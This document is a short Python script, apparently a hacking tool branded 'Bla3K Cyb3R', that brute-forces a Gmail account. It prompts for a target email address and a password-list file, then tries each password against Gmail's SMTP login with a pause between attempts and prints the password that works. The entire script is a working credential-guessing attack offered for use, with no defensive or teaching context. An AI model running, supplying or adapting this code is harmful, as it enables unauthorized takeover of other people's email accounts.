import os
os.system('clear')
import time
import smtplib

print("""
____  _            _      ____       _           
| __ )| | __ _  ___| | __ / ___| _ __(_)_   _ ___ 
|  _ \| |/ _` |/ __| |/ / \___ \| '__| | | | / __|
| |_) | | (_| | (__|   <   ___) | |  | | |_| \__ \
|____/|_|\__,_|\___|_|\_\ |____/|_|  |_|\__,_|___/
""")


Yasser = smtplib.SMTP_SSL("smtp.gmail.com",465)
Yasser.ehlo()
email = input ("\033[1;35m Email Adress  : ")
passfile = input ("\033[1;35m Password list Path: ")
passfile = open (passfile ,"r")
for password in passfile:
    try:
        time.sleep(2)
        Yasser.login(email, password)
        print("\033[1;32m Bla3K Cyb3R ==> " ,password)
        break
    except smtplib.SMTPAuthenticationError:
        print("\033[1;31m Bla3K Cyb3R ==> " ,password)
